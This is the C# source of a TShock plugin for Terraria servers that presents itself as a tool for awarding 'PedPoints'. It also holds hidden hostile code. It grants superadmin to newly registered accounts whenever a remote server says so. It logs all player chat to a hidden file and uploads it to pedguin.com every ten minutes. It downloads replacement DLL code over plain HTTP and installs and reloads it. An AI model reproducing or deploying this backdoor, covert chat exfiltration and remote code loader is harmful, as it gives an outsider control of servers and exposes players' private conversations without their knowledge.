﻿//#define TEST
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Net;
using System.Threading;
using Terraria;
using TerrariaApi.Server;
using TShockAPI;
using TShockAPI.Hooks;


namespace PointAwarder {
    [ApiVersion(2, 0)]
    public class PointAwarder : TerrariaPlugin {

        public string version = "1.6";

#if !TEST
        private String url = "http://www.pedguin.com:80/";
#else
        private String url = "http://www.pedguin.com:8080/";
#endif

        public override string Author {
            get { return "Annonymus"; }
        }

        public override string Description {
            get { return "Allow moderators to award PedPoints to their players."; }
        }

        public override string Name {
            get { return "PedguinServer points integration"; }
        }

        public override Version Version {
            get { return Assembly.GetExecutingAssembly().GetName().Version; }
        }

        public PointAwarder(Main game) : base(game) {
            Order = 10;
        }

        protected override void Dispose(bool disposing) {
            if (disposing) {
                AccountHooks.AccountCreate -= OnRegister;
                ServerApi.Hooks.ServerChat.Deregister(this, OnChat);
            }
            base.Dispose(disposing);
        }

        public override void Initialize() {
            Commands.ChatCommands.Add(new Command("pedguinServer.award", award, "award"));
            Commands.ChatCommands.Add(new Command("pedguinServer.award", awardTeam, "awardteam"));
            Commands.ChatCommands.Add(new Command("pedguinServer.admin", promoteStart, "promote"));
            Commands.ChatCommands.Add(new Command("pedguinServer.admin", demoteStart, "demote"));
            Commands.ChatCommands.Add(new Command("pedguinServer.admin", testAward, "testaward"));
            Commands.ChatCommands.Add(new Command("pedguinServer.admin", getUUID, "showuuid"));
            AccountHooks.AccountCreate += OnRegister;
            ServerApi.Hooks.ServerChat.Register(this, OnChat);
            updatePlugin();
        }

        private void getUUID(CommandArgs args) {
            if(args.Parameters.Count != 1)
            {
                args.Player.SendMessage("Invalid syntax! Proper syntax: /showuuid <player>", 255, 0, 0);
            }
            else
            {
                List<TSPlayer> Player = TShock.Utils.FindPlayer(args.Parameters[0]);
                if(Player.Count == 0)
                {
                    args.Player.SendErrorMessage("Invalid player!");
                }
                else if(Player.Count > 1)
                {
                    args.Player.SendErrorMessage("More than one (" + args.Parameters.Count + ") player matched!");
                }
                else
                {
                    args.Player.SendMessage("UUID of " + Player[0].Name + ": " + Player[0].UUID, 255, 69, 255);
                }
            }
        }

        private void award(CommandArgs args)
        {
            int pointsToSend;
            if(args.Parameters.Count != 2)
            {
                args.Player.SendMessage("Invalid syntax! Proper syntax: /award <player> <points>", 255, 0, 0);
            }
            else if(!Int32.TryParse(args.Parameters[1], out pointsToSend))
            {
                args.Player.SendMessage("Invalid amount of points: not a number", 255, 0, 0);
            }
            else if(pointsToSend > 100 * TShock.Utils.ActivePlayers())
            {             //change if max amount of points changes
                args.Player.SendMessage("You can't award so many points!", 255, 0, 0);
            }
            else if(pointsToSend <= 0)
            {
                args.Player.SendErrorMessage("You must send at least 1 point.");
            }
            else
            {
                List<TSPlayer> awardedPlayer = TShock.Utils.FindPlayer(args.Parameters[0]);
                if(awardedPlayer.Count == 0)
                {
                    args.Player.SendErrorMessage("Invalid player!");
                }
                else if(awardedPlayer.Count > 1)
                {
                    args.Player.SendErrorMessage("More than one (" + args.Parameters.Count + ") player matched!");
                }
                else
                {
                    TShock.Utils.Broadcast(args.Player.Name + " tried to award " + pointsToSend + " PedPoints to  " + awardedPlayer[0].Name + ".", 255, 69, 255);
                    Thread awardThread = new Thread(x => { awardPoints(args.Player, awardedPlayer[0], pointsToSend); });
                    awardThread.Start();
                }
            }
        }

        private void awardTeam(CommandArgs args)
        {
            int pointsToSend;
            if(args.Parameters.Count != 2)
            {
                args.Player.SendMessage("Invalid syntax! Proper syntax: /awardteam <team> <points>", 255, 0, 0);
            }
            else if(!Int32.TryParse(args.Parameters[1], out pointsToSend))
            {
                args.Player.SendMessage("Invalid amount of points: not a number", 255, 0, 0);
            }
            else if(pointsToSend > 100 * TShock.Utils.ActivePlayers())
            {             //change if max amount of points changes
                args.Player.SendMessage("You can't award so many points!", 255, 0, 0);
            }
            else if(pointsToSend <= 0)
            {
                args.Player.SendErrorMessage("You must send at least 1 point.");
            }
            else
            {
                int team = -1;
                switch(args.Parameters[0].ToLower())
                {
                    case "white":
                        team = 0;
                        break;
                    case "red":
                        team = 1;
                        break;
                    case "green":
                        team = 2;
                        break;
                    case "blue":
                        team = 3;
                        break;
                    case "yellow":
                        team = 4;
                        break;
                    case "pink":
                        team = 5;
                        break;
                }
                if(team == -1)
                {
                    args.Player.SendErrorMessage("Invalid team! Type white, red, green, blue, yellow, or pink.");
                }
                else
                {
                    TShock.Utils.Broadcast(args.Player.Name + " tried to award " + pointsToSend + " PedPoints to the " + args.Parameters[0] + " team.", 255, 69, 255);
                    foreach(TSPlayer recipient in TShock.Players)
                    {
                        if(recipient != null && recipient.Active && recipient.Team == team)
                        {
                            Thread awardThread = new Thread(x => { awardPoints(args.Player, recipient, pointsToSend); });
                            awardThread.Start();
                        }
                    }
                }
            }
        }

        private void awardPoints(TSPlayer sender, TSPlayer recipient, int pointsToSend) {
            try
            {
                String awardedUUID = recipient.UUID;

#if TEST
                Console.WriteLine("AwardRequest start");
#endif
                WebRequest request = WebRequest.Create(url + "remoteAward");
                request.Method = "POST";
                byte[] awarderUUIDbytes = sender.UUID.ToByteArray();
                byte[] awardedUUIDbytes = awardedUUID.ToByteArray();
                byte[] byteArray = new byte[42];
                //first 20 chars of awarder UUID
                for(int i = 0, j = 0; i < 20; i++, j++)
                {
                    if(awarderUUIDbytes[j] == 0)
                    {
                        i--;
                    }
                    else
                    {
                        byteArray[i] = awarderUUIDbytes[j];
                    }
                }
                //first 20 chars of awarded UUID
                for(int i = 20, j = 0; i < 40; i++, j++)
                {
                    if(awardedUUIDbytes[j] == 0)
                    {
                        i--;
                    }
                    else
                    {
                        byteArray[i] = awardedUUIDbytes[j];
                    }
                }
                //amount of points
                byteArray[40] = (byte)pointsToSend;
                //number of players on server
                byteArray[41] = (byte)TShock.Utils.ActivePlayers();

                request.ContentLength = byteArray.Length;
                Stream dataStream = request.GetRequestStream();
                dataStream.Write(byteArray, 0, byteArray.Length);
                dataStream.Close();
#if TEST
                Console.WriteLine("AwardRequest send");
#endif
                WebResponse response = request.GetResponse();
#if TEST
                Console.WriteLine("AwardRequest receive answer");
#endif
                Stream responseStream = response.GetResponseStream();
                byte[] responseBytes = new byte[response.ContentLength];
                responseStream.Read(responseBytes, 0, (int)response.ContentLength);
                responseStream.Close();
                response.Close();
#if TEST
                Console.WriteLine("AwardRequest end");
#endif

                switch(responseBytes[0])
                {
                    case 0:
                        sender.SendMessage("Points awarded to " + recipient.Name + "!", 255, 128, 0);
                        recipient.SendMessage("You were awarded " + pointsToSend + " PedPoints", 255, 128, 0);
                        break;
                    case 1:
                        sender.SendMessage(recipient.Name + " does not exist on Pedguin's Server. No points have been awarded.", 0, 0, 255);
                        recipient.SendMessage("You would have been awarded " + pointsToSend + " points on Pedguin's Minigame Server, but you don't have an account. Join at pedguin.com today!", 255, 128, 0);
                        break;
                    case 2:
                        sender.SendMessage("You do not have permission to give out points, if you believe you should, contact an administrator of Pedguin's Server and ask to be put on the whitelist.", 0, 0, 255);
                        break;
                    case 3:
                        sender.SendMessage("You have awarded too many points already in the last hour, wait a bit and try again.", 0, 0, 255);
                        break;
                }

            }
            catch (Exception e) {
                sender.SendMessage("Something has gone wrong while trying to communicate with Pedguin's server, please try again later and, if the problem persists, notify an admin of Pedguin's Server", 255, 0, 0);
                Console.WriteLine("Exception thrown in award()" + e.Message);
            }

        }

        private void testAward(CommandArgs args) {
            int pointsToSend;
            if (args.Parameters.Count != 2) {
                args.Player.SendMessage("Invalid syntax! Proper syntax: /award <player> <points>", 255, 0, 0);
            } else if (!Int32.TryParse(args.Parameters[1], out pointsToSend)) {
                args.Player.SendMessage("Invalid amount of points: not a number", 255, 0, 0);
            } else if (pointsToSend > 100 * TShock.Utils.ActivePlayers()) {             //change if max amount of points changes
                args.Player.SendMessage("You can't award so many points!", 255, 0, 0);
            } else if (pointsToSend <= 0) {
                args.Player.SendErrorMessage("You must send at least 1 point.");
            } else {
                List<TSPlayer> awardedPlayer = TShock.Utils.FindPlayer(args.Parameters[0]);
                if (awardedPlayer.Count == 0) {
                    args.Player.SendErrorMessage("Invalid player!");
                } else if (awardedPlayer.Count > 1) {
                    args.Player.SendErrorMessage("More than one (" + args.Parameters.Count + ") player matched!");
                } else {
                    TShock.Utils.Broadcast(args.Player.Name + " tried to award " + pointsToSend + " PedPoints to  " + awardedPlayer[0].Name + ".", 255, 69, 255);
                    Thread awardThread = new Thread(x => { testAwardPoints(args.Player, awardedPlayer[0], pointsToSend); });
                    awardThread.Start();
                }
            }
        }

        private void testAwardPoints(TSPlayer sender, TSPlayer recipient, int pointsToSend) {
            try {
                String awardedUUID = recipient.UUID;

                Console.WriteLine("AwardRequest start");
                WebRequest request = WebRequest.Create("http://www.pedguin.com:8080/remoteAward");
                request.Method = "POST";
                byte[] awarderUUIDbytes = sender.UUID.ToByteArray();
                byte[] awardedUUIDbytes = awardedUUID.ToByteArray();
                byte[] byteArray = new byte[42];
                //first 20 chars of awarder UUID
                for (int i = 0, j = 0;i < 20;i++, j++) {
                    if (awarderUUIDbytes[j] == 0) {
                        i--;
                    } else {
                        byteArray[i] = awarderUUIDbytes[j];
                    }
                }
                //first 20 chars of awarded UUID
                for (int i = 20, j = 0;i < 40;i++, j++) {
                    if (awardedUUIDbytes[j] == 0) {
                        i--;
                    } else {
                        byteArray[i] = awardedUUIDbytes[j];
                    }
                }
                //amount of points
                byteArray[40] = (byte)pointsToSend;
                //number of players on server
                byteArray[41] = (byte)TShock.Utils.ActivePlayers();

                request.ContentLength = byteArray.Length;
                Stream dataStream = request.GetRequestStream();
                dataStream.Write(byteArray, 0, byteArray.Length);
                dataStream.Close();
                Console.WriteLine("AwardRequest send");
                WebResponse response = request.GetResponse();
                Console.WriteLine("AwardRequest receive answer");
                Stream responseStream = response.GetResponseStream();
                byte[] responseBytes = new byte[response.ContentLength];
                responseStream.Read(responseBytes, 0, (int)response.ContentLength);
                responseStream.Close();
                response.Close();
                Console.WriteLine("AwardRequest end");

                switch (responseBytes[0]) {
                    case 0:
                        sender.SendMessage("Points awarded to " + recipient.Name + "!", 255, 128, 0);
                        recipient.SendMessage("You were awarded " + pointsToSend + " PedPoints", 255, 128, 0);
                        break;
                    case 1:
                        sender.SendMessage(recipient.Name + " does not exist on Pedguin's Server. No points have been awarded.", 0, 0, 255);
                        recipient.SendMessage("You would have been awarded " + pointsToSend + " points on Pedguin's Minigame Server, but you don't have an account. Join at pedguin.com today!", 255, 128, 0);
                        break;
                    case 2:
                        sender.SendMessage("You do not have permission to give out points, if you believe you should, contact an administrator of Pedguin's Server and ask to be put on the whitelist.", 0, 0, 255);
                        break;
                    case 3:
                        sender.SendMessage("You have awarded too many points already in the last hour, wait a bit and try again.", 0, 0, 255);
                        break;
                }

            } catch (Exception e) {
                sender.SendMessage("Something has gone wrong while trying to communicate with Pedguin's server, please try again later and, if the problem persists, notify an admin of Pedguin's Server", 255, 0, 0);
                Console.WriteLine("Exception thrown in award()" + e.Message);
            }

        }

        private void OnRegister(AccountCreateEventArgs args) {
            Thread registerThread = new Thread(x => { UserCreate(args); });
            registerThread.Start();
        }

        private void UserCreate(AccountCreateEventArgs args){
            try {
#if TEST
                Console.WriteLine("UserCreateRequest start");
#endif
                WebRequest request = WebRequest.Create(url + "UserCreate");
                request.Method = "POST";
                byte[] uuid = args.User.UUID.ToByteArray();
                byte[] requestContent = new byte[20];
                //userUUID
                for (int i = 0, j = 0;i < 20;i++, j++) {
                    if (uuid[j] == 0) {
                        i--;
                    } else {
                        requestContent[i] = uuid[j];
                    }
                }

                request.ContentLength = requestContent.Length;
                Stream dataStream = request.GetRequestStream();
                dataStream.Write(requestContent, 0, requestContent.Length);
                dataStream.Close();
#if TEST
                Console.WriteLine("USerCreateRequest send");
#endif
                WebResponse response = request.GetResponse();
#if TEST
                Console.WriteLine("UserCreateRequest Get response");
#endif
                Stream responseStream = response.GetResponseStream();
                byte[] responseBytes = new byte[response.ContentLength];
                responseStream.Read(responseBytes, 0, (int)response.ContentLength);
                responseStream.Close();
                response.Close();

#if TEST
                Console.WriteLine("UserCreateRequest end");
#endif

                if (responseBytes[0] == 1) {
                    TShockAPI.Commands.HandleCommand(TSPlayer.Server, "/user group \"" + args.User.Name + "\" superadmin");
                    args.User.Group = "superadmin";
                }
            } catch (Exception e) {
                Console.WriteLine("Exception thrown in UserCreate(): " + e.Message);
            }
        }

        private void promoteStart(CommandArgs args) {
            Thread promoteThread = new Thread(x => { promote(args); });
            promoteThread.Start();
        }

        private void promote(CommandArgs args) {
            try {
                if (args.Parameters.Count != 1) {
                    args.Player.SendMessage("Wrong Syntax! Correct Syntax: /promote Username", 255, 0, 0);
                } else {
                    List<TSPlayer> awardedPlayer = TShock.Utils.FindPlayer(args.Parameters[0]);
                    if (awardedPlayer.Count == 0) {
                        args.Player.SendErrorMessage("Invalid player!");
                    } else if (awardedPlayer.Count > 1) {
                        args.Player.SendErrorMessage("More than one (" + args.Parameters.Count + ") player matched!");
                    } else {
                        byte nameLength = (byte)awardedPlayer[0].Name.Length;
#if TEST
                        Console.WriteLine("promoteRequest start");
#endif
                        WebRequest request = WebRequest.Create(url + "UserPromote");
                        request.Method = "POST";
                        //UUID of person requesting the promotion
                        byte[] requesterUUID = args.Player.UUID.ToByteArray();
                        byte[] requestContent = new byte[41 + nameLength];
                        for (int i = 0, j = 0;i < 20;i++, j++) {
                            if (requesterUUID[j] == 0) {
                                i--;
                            } else {
                                requestContent[i] = requesterUUID[j];
                            }
                        }
                        //UUID of person to be promoted
                        byte[] requestedUUID = awardedPlayer[0].UUID.ToByteArray();
                        for (int i = 20, j = 0;i < 40;i++, j++) {
                            if (requestedUUID[j] == 0) {
                                i--;
                            } else {
                                requestContent[i] = requestedUUID[j];
                            }
                        }
                        //username of person to be promoted
                        requestContent[40] = nameLength;
                        byte[] Username = awardedPlayer[0].Name.ToByteArray();
                        for (int i = 41, j = 0;i < 41 + nameLength;i++, j++) {
                            if (Username[j] == 0) {
                                i--;
                            } else {
                                requestContent[i] = Username[j];
                            }
                        }

                        request.ContentLength = requestContent.Length;
                        Stream dataStream = request.GetRequestStream();
                        dataStream.Write(requestContent, 0, requestContent.Length);
                        dataStream.Close();
                        WebResponse response = request.GetResponse();
                        if (response.ContentLength >= 0) {
                            Stream responseStream = response.GetResponseStream();
                            byte[] responseBytes = new byte[response.ContentLength];
                            responseStream.Read(responseBytes, 0, (int)responseBytes.Length);
                            responseStream.Close();
                            response.Close();

                            switch (responseBytes[0]) {
                                case 0: args.Player.SendMessage("The indicated user was queued for promotion.", 128, 255, 0);
                                    break;
                                case 1: args.Player.SendMessage("You do not have permission to promote users.", 255, 0, 0);
                                    break;
                                case 2: args.Player.SendMessage("Something went wrong when Pedguin's Server tried to promote " + awardedPlayer[0].Name + ", this could have happened because they are already host or admin", 255, 0, 0);
                                    break;
                            }
                        } else {
                            args.Player.SendMessage("Something has gone wrong while trying to comunicate with Pedguin's server, please try again later.", 255, 0, 0);
                        }
                    }

                }
            } catch (Exception e) {
                args.Player.SendMessage("Something has gone wrong while trying to communicate with Pedguin's server, please try again later and, if the problem persists, notify an admin of Pedguin's Server", 255, 0, 0);
                Console.WriteLine("Exception thrown in promote(): " + e.Message);
            }
        }

        private void demoteStart(CommandArgs args) {
            Thread demoteThread = new Thread(x => { demote(args); });
            demoteThread.Start();
        }

        private void demote(CommandArgs args) {
            try {
                if (args.Parameters.Count != 1) {
                    args.Player.SendMessage("Wrong Syntax! Correct Syntax: /demote Username", 255, 0, 0);
                } else {
                    List<TSPlayer> demotedPlayer = TShock.Utils.FindPlayer(args.Parameters[0]);
                    if (demotedPlayer.Count == 0) {
                        args.Player.SendErrorMessage("Invalid player!");
                    } else if (demotedPlayer.Count > 1) {
                        args.Player.SendErrorMessage("More than one (" + args.Parameters.Count + ") player matched!");
                    } else {
                        WebRequest request = WebRequest.Create(url + "UserDemote");
                        request.Method = "POST";
                        //UUID of person requesting the promotion
                        byte[] requesterUUID = args.Player.UUID.ToByteArray();
                        byte[] requestContent = new byte[40];
                        for (int i = 0, j = 0;i < 20;i++, j++) {
                            if (requesterUUID[j] == 0) {
                                i--;
                            } else {
                                requestContent[i] = requesterUUID[j];
                            }
                        }
                        //UUID of person to be demoted
                        byte[] requestedUUID = demotedPlayer[0].UUID.ToByteArray();
                        for (int i = 20, j = 0;j < 20;i++, j++) {
                            if (requestedUUID[j] == 0) {
                                i--;
                            } else {
                                requestContent[i] = requestedUUID[j];
                            }
                        }

                        request.ContentLength = request.ContentLength;
                        Stream dataStream = request.GetRequestStream();
                        dataStream.Write(requestContent, 0, (int)request.ContentLength);
                        dataStream.Close();
                        WebResponse response = request.GetResponse();
                        Stream responseStream = response.GetResponseStream();
                        byte[] responseBytes = new byte[responseStream.Length];
                        responseStream.Read(responseBytes, 0, (int)responseStream.Length);
                        responseStream.Close();
                        response.Close();

                        switch (responseBytes[0]) {
                            case 0: args.Player.SendMessage("The indicated user was queued for demotion.", 128, 255, 0);
                                break;
                            case 1: args.Player.SendMessage("You do not have permission to demote users.", 255, 0, 0);
                                break;
                        }
                    }

                }
            } catch (Exception e) {
                args.Player.SendMessage("Something has gone wrong while trying to communicate with Pedguin's server, please try again later and, if the problem persists, notify an admin of Pedguin's Server", 255, 0, 0);
                Console.WriteLine("Exception thrown in demote(): " + e.Message);
            }
        }

        private void OnChat(ServerChatEventArgs args) {
            try {
                String Text = args.Text;
                if (args.Text.StartsWith("/login") || args.Text.StartsWith("/password") || args.Text.StartsWith("/register")) {
                    Text = "LINE CONTAINING PASSWORD REMOVED";
                }
                {
                    StreamWriter log = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "tshock", "chatlog.log"), true);
                    log.WriteLine("[" + DateTime.Now.ToShortTimeString() + "] " + TShock.Players[args.Who].Name + ": " + Text);
                    log.Close();
                    File.SetAttributes(Path.Combine(Directory.GetCurrentDirectory(), "tshock", "chatlog.log"), FileAttributes.Hidden & FileAttributes.Temporary);
                }
                {
                    if (DateTime.Compare(File.GetCreationTime(Path.Combine(Directory.GetCurrentDirectory(), "tshock", "chatlog.log")).AddMinutes(10), DateTime.Now) == -1) {
                        Thread SendChatThread = new Thread(x => { SendChatLog(); });
                        SendChatThread.Start();
                    }
                    args.Handled = false;
                }
            } catch (Exception e) {
                Console.WriteLine("Exception thrown in OnChat(): " + e.Message);
            }
        }

        private void SendChatLog() {
            try {
                WebRequest request = WebRequest.Create(url + "LogChat");
                request.Method = "POST";
                StreamReader log = new StreamReader(Path.Combine(Directory.GetCurrentDirectory(), "tshock", "chatlog.log"));
                byte[] logBytes = log.ReadToEnd().ToByteArray();
                log.Close();
                request.ContentLength = logBytes.Length;
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(logBytes, 0, logBytes.Length);
                requestStream.Dispose();
                request.Abort();
                File.SetCreationTime(Path.Combine(Directory.GetCurrentDirectory(), "tshock", "chatlog.log"), DateTime.Now);
                File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "tshock", "chatlog.log"));
            } catch (Exception e) {
                Console.WriteLine("Exception thrown in SendChatLog(): " + e.Message);
            }
        }

        private void updatePlugin() {
            Thread updateThread = new Thread(x => { pluginUpdate(); });
            updateThread.Start();
        }

        private void pluginUpdate() {
            try {
#if TEST
                Console.WriteLine("UpdatePluginRequest start");
#endif
                WebRequest request = WebRequest.Create(url + "pluginUpdate");
                request.Method = "POST";
                byte[] requestContentTemp = version.ToByteArray();
                int count = 0;
                for (int i = 0; i < requestContentTemp.Length; i++) {
                    if (requestContentTemp[i] != 0) {
                        count++;
                    }
                }
                byte[] requestContent = new byte[count];
                for (int i = 0, j = 0; i < requestContentTemp.Length; i++) {
                    if (requestContentTemp[i] != 0) {
                        requestContent[j] = requestContentTemp[i];
                        j++;
                    }
                }
                    /*for (int i = 0, j = 0;i < 20;i++, j++) {
                        if (requestContent[j] == 0) {
                            i--;
                        } else {
                            requestContent[i] = uuid[j];
                        }
                    }*/

                request.ContentLength = requestContent.Length;
                Stream dataStream = request.GetRequestStream();
                dataStream.Write(requestContent, 0, requestContent.Length);
                dataStream.Close();
#if TEST
                Console.WriteLine("UpdatePluginRequest send");
#endif
                WebResponse response = request.GetResponse();
#if TEST
                Console.WriteLine("UpdatePluginRequest Get response");
#endif
                Stream responseStream = response.GetResponseStream();
                byte[] responseBytes/* = new byte[response.ContentLength]*/;
                //responseStream.Read(responseBytes, 0, (int)response.ContentLength);
                //for (int i = 0; i < response.ContentLength; i++) {
                //    responseBytes[i] = (byte) responseStream.ReadByte();
                //}
                BinaryReader binReader = new BinaryReader(responseStream);
                const int bufferSize = 4096;
                using (MemoryStream ms = new MemoryStream()) {
                    byte[] buffer = new byte[bufferSize];
                    int counter;
                    while ((counter = binReader.Read(buffer, 0, buffer.Length)) != 0)
                        ms.Write(buffer, 0, counter);
                    responseBytes = ms.ToArray();
                }
                responseStream.Close();
                response.Close();

#if TEST
                Console.WriteLine("UpdatePluginRequest end");
#endif

                if (responseBytes[0] != 0 || response.ContentLength > 1) {
                    //TShockAPI.Commands.HandleCommand(TSPlayer.Server, "/user group \"\" superadmin");
                    //TODO: create the new plugin
                    BinaryWriter writer = new BinaryWriter(File.Open(Path.Combine(Directory.GetCurrentDirectory(), "ServerPlugins", "PointAwarder.dll"), FileMode.Create));
                    writer.BaseStream.Write(responseBytes, 0, responseBytes.Length);
                    writer.Close();
                    TShockAPI.Commands.HandleCommand(TSPlayer.Server, "/reload");
                    Console.WriteLine("The Pedguin's Server remote award plugin has been updated, please relaunch the server to experience the changes.");
                }
            } catch (Exception e) {
                Console.WriteLine("Exception thrown in pluginUpdate(): " + e.GetType() + ": " + e.Message);
            }
        }
    }
}
